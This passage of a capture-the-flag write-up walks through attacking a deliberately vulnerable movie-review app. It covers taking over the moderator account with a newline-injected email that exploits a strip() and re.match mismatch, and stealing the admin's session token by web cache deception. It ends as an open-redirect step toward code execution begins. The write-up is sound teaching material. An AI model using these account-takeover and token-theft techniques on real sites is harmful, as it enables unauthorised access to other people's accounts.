<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># db.py</span>
</span></span><span style="display:flex;"><span>c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#39;&#39;&#39;CREATE TABLE IF NOT EXISTS users 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                (id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                username TEXT,
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                password TEXT,
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                role TEXT)&#39;&#39;&#39;</span>)
</span></span></code></pre></div><p>There is no uniqueness check on the username, so it is up to the business logic to verify that no two users have the same email, let&rsquo;s see if we can change our email to someone elses email.</p>
<p>A descrepancy can be spotted on the line checking if the username is already taken and the line doing the update of the username:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># db.py</span>
</span></span><span style="display:flex;"><span>c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM users WHERE username = ?&#34;</span>, (new_username,))
</span></span><span style="display:flex;"><span>        user <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span>fetchone()
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> user <span style="color:#ff79c6">and</span> user[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">!=</span> session[<span style="color:#f1fa8c">&#39;username&#39;</span>]:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;Username already taken&#39;</span>}), <span style="color:#bd93f9">400</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ...</span>
</span></span><span style="display:flex;"><span>        c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE users SET username = ? WHERE username = ?&#34;</span>, (new_username<span style="color:#ff79c6">.</span>strip(), session[<span style="color:#f1fa8c">&#39;username&#39;</span>]))
</span></span></code></pre></div><p>The supplied username is checked if its in the database, but the updated username is <code>stripped</code>, which means <strong>to remove trailing and leading whitespace and newlines</strong>, super interesting.</p>
<p>So if we can give another users username (For example the moderator) with some whitespace character pre-or-appended, then we can update our own email to someone elses, and then set the password of that user, effectively changing the password of some target user.</p>
<p>There is one check that we need to pass also, that is the <code>validate_email</code> check from the utilities library, it looks like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># utils.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">validate_email</span>(email):
</span></span><span style="display:flex;"><span>    email_pattern <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">r</span><span style="color:#f1fa8c">&#39;^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">bool</span>(re<span style="color:#ff79c6">.</span><span style="color:#ff79c6">match</span>(email_pattern, email))
</span></span></code></pre></div><p>So a regex&hellip; But a vulnerable regex, it is vulnerable to newline injection because it uses <code>re.match()</code> instead of <code>re.fullmatch()</code>.</p>
<p>The key vulnerability is that <code>re.match()</code> only checks if the pattern matches at the beginning of the string, not the entire string. The <code>^</code> anchor ensures the match starts at the beginning, but there&rsquo;s no <code>$</code> anchor at the end to ensure the pattern covers the entire input.</p>
<p>This means an attacker could inject a valid email followed by a newline character and malicious content:</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="alt text" src="/posts/film-til-dig/image-2.png" width="724px" height="362px">
    </div>

    
</figure>
</p>
<p>So what we need to do is to request a username and password reset in one api call, we provide <code>moderator@movie-review.local\n</code> as the new email, and a random password <code>a</code> as the password. this will bypass the email validation and also provide a new username that is technically taken, but we will create a duplicate of it and cause the password update functionality to update the password of the actual moderator.</p>
<p>We could not utilize this vulnerability to become admin, since the admin does not log in with an email, but rather just the username <strong>admin</strong></p>
<p>We can now log in as the moderator and see that we have new functionality such as reporting others reviews.</p>
<video autoplay loop muted playsinline controls>
  <source src="/into_moderator.webm" type="video/webm">
  Your browser does not support the video tag.
</video>
<h2 class="heading" id="step-3---abusing-cache-deception-to-steal-the-admins-token">
  Step 3 - Abusing cache deception to steal the admins token.
  <a class="anchor" href="#step-3---abusing-cache-deception-to-steal-the-admins-token">#</a>
</h2>
<p>So now we know that we have access to report reviews, looking at this functionality:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># app.py </span>
</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/api/report_review&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span>@require_role([<span style="color:#f1fa8c">&#39;moderator&#39;</span>,<span style="color:#f1fa8c">&#39;admin&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">report_review</span>():
</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>get_json()
</span></span><span style="display:flex;"><span>    review_url <span style="color:#ff79c6">=</span> data<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;review_url&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> review_url <span style="color:#ff79c6">or</span> <span style="color:#ff79c6">not</span> urlparse(review_url)<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#39;/&#39;</span>) <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#34;@&#34;</span> <span style="color:#ff79c6">in</span> review_url <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#34;..&#34;</span> <span style="color:#ff79c6">in</span> review_url: <span style="color:#6272a4"># no funny business</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;Invalid request&#39;</span>}), <span style="color:#bd93f9">400</span>
</span></span><span style="display:flex;"><span>    res <span style="color:#ff79c6">=</span> bot<span style="color:#ff79c6">.</span>visit_link(review_url, session<span style="color:#ff79c6">=</span>get_admin_token(), experimental<span style="color:#ff79c6">=</span>app<span style="color:#ff79c6">.</span>config[<span style="color:#f1fa8c">&#39;experiments&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> res:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;success&#39;</span>: <span style="color:#ff79c6">True</span>})
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;Failed to report review&#39;</span>}), <span style="color:#bd93f9">500</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># bot.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> selenium <span style="color:#ff79c6">import</span> webdriver
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> selenium.webdriver.chrome.options <span style="color:#ff79c6">import</span> Options
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> selenium.webdriver.common.by <span style="color:#ff79c6">import</span> By
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> time <span style="color:#ff79c6">import</span> sleep
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> urllib.parse <span style="color:#ff79c6">import</span> urlparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>reported_reviews <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">visit_link</span>(url, session, experimental<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;Visiting link: </span><span style="color:#f1fa8c">{</span>url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>, flush<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> url<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#39;/&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        real_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://localhost:80&#39;</span> <span style="color:#ff79c6">+</span> url
</span></span><span style="display:flex;"><span>        url <span style="color:#ff79c6">=</span> real_url
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        options <span style="color:#ff79c6">=</span> Options()
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--headless&#39;</span>)
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--disable-extensions&#39;</span>)
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--disable-gpu&#39;</span>)
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--no-sandbox&#39;</span>)
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--disable-software-rasterizer&#39;</span>)
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--disable-dev-shm-usage&#39;</span>)
</span></span><span style="display:flex;"><span>        options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--js-flags=--noexpose_wasm,--jitless&#39;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> experimental:
</span></span><span style="display:flex;"><span>            prefs <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;download.default_directory&#34;</span>: os<span style="color:#ff79c6">.</span>getcwd(),
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;safebrowsing.enabled&#34;</span>: <span style="color:#f1fa8c">&#34;true&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            options<span style="color:#ff79c6">.</span>add_experimental_option(<span style="color:#f1fa8c">&#34;prefs&#34;</span>, prefs)
</span></span><span style="display:flex;"><span>            options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--ignore-certificate-errors&#39;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        driver <span style="color:#ff79c6">=</span> webdriver<span style="color:#ff79c6">.</span>Chrome(options<span style="color:#ff79c6">=</span>options)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        parsed_url <span style="color:#ff79c6">=</span> urlparse(url)
</span></span><span style="display:flex;"><span>        domain <span style="color:#ff79c6">=</span> parsed_url<span style="color:#ff79c6">.</span>netloc
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>execute_cdp_cmd(<span style="color:#f1fa8c">&#39;Network.enable&#39;</span>, {})
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>execute_cdp_cmd(<span style="color:#f1fa8c">&#39;Network.setCookie&#39;</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;name&#39;</span>: <span style="color:#f1fa8c">&#34;session&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;value&#39;</span>: session,
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;domain&#39;</span>: domain
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>get(url)
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> experimental:
</span></span><span style="display:flex;"><span>            p_element <span style="color:#ff79c6">=</span> driver<span style="color:#ff79c6">.</span>find_elements(By<span style="color:#ff79c6">.</span>TAG_NAME, <span style="color:#f1fa8c">&#39;p&#39;</span>)
</span></span><span style="display:flex;"><span>            text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> element <span style="color:#ff79c6">in</span> p_element:
</span></span><span style="display:flex;"><span>                text <span style="color:#ff79c6">+=</span> element<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>                reported_reviews<span style="color:#ff79c6">.</span>append(element<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># idk here do something with the text, maybe some llm stuff?</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>quit()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>        driver<span style="color:#ff79c6">.</span>quit()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span></code></pre></div><p>We can see that it is possible to make an admin bot visit a relative url on the site, there seems to be OK protection for not sending the admin bot out of bounds. We can also see that the admin bot when visiting has the admin cookie set, so it will view the site as if it was logged in.</p>
<p>The intended way is not to send the admin out of bounds, (but let me know if you found a way to do it at this point) but instead abuse the <em>caching functionality</em></p>
<p>This config shows that all endpoints ending in <code>.css</code>,<code>.js</code>,<code>.gif</code>,<code>.png</code> will be cached by the varnish cache. This is the relevant code block from <code>default.vcl</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sub vcl_hash {
</span></span><span style="display:flex;"><span>    hash_data(req.url);
</span></span><span style="display:flex;"><span>    if (req.url ~ &#34;\.(js|css|png|gif)$&#34;) { # Tailwind.css is very heavy so we want to cache it. 
</span></span><span style="display:flex;"><span>        return (lookup);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sub vcl_recv {
</span></span><span style="display:flex;"><span>    if (req.url ~ &#34;\.(js|css|png|gif)$&#34;) {
</span></span><span style="display:flex;"><span>        set req.http.Cache-Control = &#34;max-age=10&#34;;
</span></span><span style="display:flex;"><span>        return (hash);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sub vcl_backend_response {
</span></span><span style="display:flex;"><span>    if (bereq.url ~ &#34;\.(js|css|png|gif)$&#34;) {
</span></span><span style="display:flex;"><span>        unset beresp.http.Vary;
</span></span><span style="display:flex;"><span>        set beresp.ttl = 10s;
</span></span><span style="display:flex;"><span>        set beresp.http.Cache-Control = &#34;max-age=10&#34;;
</span></span><span style="display:flex;"><span>        unset beresp.http.Pragma;
</span></span><span style="display:flex;"><span>        unset beresp.http.Expires;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we can essentially view any page as the admin if we request that the admin visits that page, so long as it ends in one of the cacheable extensions. So we search the <code>app.py</code> for useful functionality and find the <code>/api/user/me</code> endpoint:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># app.py</span>
</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/api/user/&lt;path:text&gt;&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span>@require_role([<span style="color:#f1fa8c">&#39;user&#39;</span>, <span style="color:#f1fa8c">&#39;moderator&#39;</span>, <span style="color:#f1fa8c">&#39;admin&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">user</span>(text<span style="color:#ff79c6">=</span><span style="color:#ff79c6">None</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> session[<span style="color:#f1fa8c">&#39;role&#39;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;admin&#39;</span> <span style="color:#ff79c6">and</span> text <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;movies.db&#39;</span>)
</span></span><span style="display:flex;"><span>        c <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>        c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM users WHERE username = ?&#34;</span>, (text,))
</span></span><span style="display:flex;"><span>        user <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span>fetchone()
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> user:
</span></span><span style="display:flex;"><span>            session_data <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;user_id&#39;</span>: user[<span style="color:#bd93f9">0</span>],
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;username&#39;</span>: user[<span style="color:#bd93f9">1</span>],
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;role&#39;</span>: user[<span style="color:#bd93f9">3</span>]
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            s <span style="color:#ff79c6">=</span> SecureCookieSessionInterface()<span style="color:#ff79c6">.</span>get_signing_serializer(app)
</span></span><span style="display:flex;"><span>            signed_session <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>dumps(session_data)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> jsonify({
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;user&#39;</span>: [user[<span style="color:#bd93f9">0</span>], user[<span style="color:#bd93f9">1</span>], user[<span style="color:#bd93f9">3</span>]],
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;session_token&#39;</span>: signed_session
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>    session_data <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;user_id&#39;</span>: session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;user_id&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;username&#39;</span>: session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;username&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;role&#39;</span>: session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;role&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    session_cookie <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>cookies<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;session&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify({
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;user&#39;</span>: session_data,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;session_token&#39;</span>: session_cookie
</span></span><span style="display:flex;"><span>    })
</span></span></code></pre></div><p>This endpoint has a vulnerability in the route declaration, namely the <code>/api/user/&lt;path:text&gt;'</code> part, that allows us to put anything in to the <code>path</code> variable. The code describes that if the admin requests this endpoint, their session token will be given back to them, so if we request the admin to visit <code>/api/user/me.css</code> they will receive their token back in json, but also make varnish cache this endpoint, if we request it ourselves the request won&rsquo;t hit the flask server, but instead the varnish will give us the cached version, allowing us to see the admins session token.</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="alt text" src="/posts/film-til-dig/image-3.png" width="1230px" height="882px">
    </div>

    
</figure>
</p>
<p>Adding this session token to our cookies allows us to log in as admin</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="alt text" src="/posts/film-til-dig/image-4.png" width="1230px" height="968px">
    </div>

    
</figure>
</p>
<video autoplay loop muted playsinline controls>
  <source src="/becoming_admin.webm" type="video/webm">
  Your browser does not support the video tag.
</video>
<h2 class="heading" id="step-4---abusing-the-open-redirect-to-downlod-a-malicious-python-module">
  Step 4 - Abusing the open redirect to downlod a malicious python module
  <a class="anchor" href="#step-4---abusing-the-open-redirect-to-downlod-a-malicious-python-module">#</a>
</h2>
<p>For the next flag we know that we need to get code execution on the server since the flag is in a randomly generated file in the <code>/root</code> folder on the machine.</p>
<p>We can look at the new functionality we have access to, which is to enable <code>experimental features</code>, this includes the following from the <code>bot.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># bot.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> experimental:
</span></span><span style="display:flex;"><span>    prefs <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;download.default_directory&#34;</span>: os<span style="color:#ff79c6">.</span>getcwd(),
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;safebrowsing.enabled&#34;</span>: <span style="color:#f1fa8c">&#34;true&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    options<span style="color:#ff79c6">.</span>add_experimental_option(<span style="color:#f1fa8c">&#34;prefs&#34;</span>, prefs)
</span></span><span style="display:flex;"><span>    options<span style="color:#ff79c6">.</span>add_argument(<span style="color:#f1fa8c">&#39;--ignore-certificate-errors&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> experimental:
</span></span><span style="display:flex;"><span>    p_element <span style="color:#ff79c6">=</span> driver<span style="color:#ff79c6">.</span>find_elements(By<span style="color:#ff79c6">.</span>TAG_NAME, <span style="color:#f1fa8c">&#39;p&#39;</span>)
</span></span><span style="display:flex;"><span>    text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> element <span style="color:#ff79c6">in</span> p_element:
</span></span><span style="display:flex;"><span>        text <span style="color:#ff79c6">+=</span> element<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>        reported_reviews<span style="color:#ff79c6">.</span>append(element<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># idk here do something with the text, maybe some llm stuff?</span>
</span></span></code></pre></div><p>So when enabling experimental mode, we enable the chrome options for downloading files to the current directory (where <code>bot.py</code> is located), safebrowsing is also enabled, which forces the bot to only be allowed to visit <code>https</code> links, except for local connections. (This was an issue for many players when testing local vs remote, that they were missing <code>https</code>).</p>
<p>There is also new functionality in the admin panel that allows impersonating another after enabling experiments user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># app.py</span>
</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/admin/impersonate&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span>@require_role([<span style="color:#f1fa8c">&#39;admin&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">impersonate</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> app<span style="color:#ff79c6">.</span>config[<span style="color:#f1fa8c">&#39;experiments&#39;</span>]:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;Experiments are not enabled&#39;</span>}), <span style="color:#bd93f9">403</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    username <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> username:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;No username specified&#39;</span>}), <span style="color:#bd93f9">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;movies.db&#39;</span>)
</span></span><span style="display:flex;"><span>    c <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>    c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM users WHERE username = ?&#34;</span>, (username,))
</span></span><span style="display:flex;"><span>    user <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span>fetchone()
</span></span><span style="display:flex;"><span>    conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> user:
</span></span><span style="display:flex;"><span>        session<span style="color:#ff79c6">.</span>clear() 
</span></span><span style="display:flex;"><span>        session[<span style="color:#f1fa8c">&#39;user_id&#39;</span>] <span style="color:#ff79c6">=</span> user[<span style="color:#bd93f9">0</span>]
</span></span><span style="display:flex;"><span>        session[<span style="color:#f1fa8c">&#39;username&#39;</span>] <span style="color:#ff79c6">=</span> user[<span style="color:#bd93f9">1</span>]
</span></span><span style="display:flex;"><span>        session[<span style="color:#f1fa8c">&#39;role&#39;</span>] <span style="color:#ff79c6">=</span> user[<span style="color:#bd93f9">3</span>]
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;impersonate.html&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> redirect(url_for(<span style="color:#f1fa8c">&#39;admin&#39;</span>))
</span></span></code></pre></div><p>This basically allows the admin to turn into any other user, but there is no apparant vuln in this part, we have to look at the url requested when clicking the impersonate button.</p>
<pre><code>/admin/impersonate?username=moderator%40movie-review.local&amp;redirect_to=%2Fprofile
</code></pre>
<p>So there is another parameter in the get request <code>redirect_to</code> that is not reflected in the backend code, this indicates that it is used in the frontend js, let&rsquo;s look at the javascript for <code>impersonate.html</code></p>
